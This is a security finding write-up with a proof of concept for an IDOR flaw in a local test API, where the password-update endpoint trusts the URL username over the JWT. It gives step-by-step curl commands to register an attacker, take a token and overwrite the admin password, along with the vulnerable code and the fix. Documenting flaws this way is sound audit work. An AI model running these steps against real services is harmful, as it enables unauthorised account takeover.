# C3 PoC: Unauthorized Password Update (IDOR)

**Severity**: Critical  
**Endpoint**: `PUT /users/v1/{username}/password`  
**File**: `api_views/users.py:186-189`  
**PoC-Status**: theoretical

## Vulnerability

When `vuln=1` (default), `update_password` trusts the `username` URL parameter rather than the identity in the JWT. Any valid token grants write access to any account's password.

## Exploit Steps

### 1. Register an attacker account

```bash
curl -s -X POST http://localhost:5000/users/v1/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"attacker123","email":"attacker@evil.com"}'
```

### 2. Obtain attacker JWT

```bash
TOKEN=$(curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"attacker","password":"attacker123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['auth_token'])")

echo "Attacker token: $TOKEN"
```

### 3. Overwrite admin's password using attacker's token

```bash
curl -s -X PUT http://localhost:5000/users/v1/admin/password \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"password":"pwned123"}'
```

Expected response:
```json
{"status": "success", "Password": "Updated."}
```

### 4. Confirm takeover — log in as admin with the new password

```bash
curl -s -X POST http://localhost:5000/users/v1/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"pwned123"}'
```

A successful login response with an `auth_token` confirms full admin account takeover.

## Root Cause

```python
# api_views/users.py:186-189
if vuln:
    user = User.query.filter_by(username=username).first()  # URL param, not token subject
    if user:
        user.password = request_data.get('password')
        db.session.commit()
```

The fix (already present under `else`) is to resolve the target from `resp['sub']` (the JWT subject) instead of the path parameter.

## Impact

Full account takeover of any user, including administrators. An attacker with any valid session can lock out all other users, escalate to admin privileges, and exfiltrate protected data.
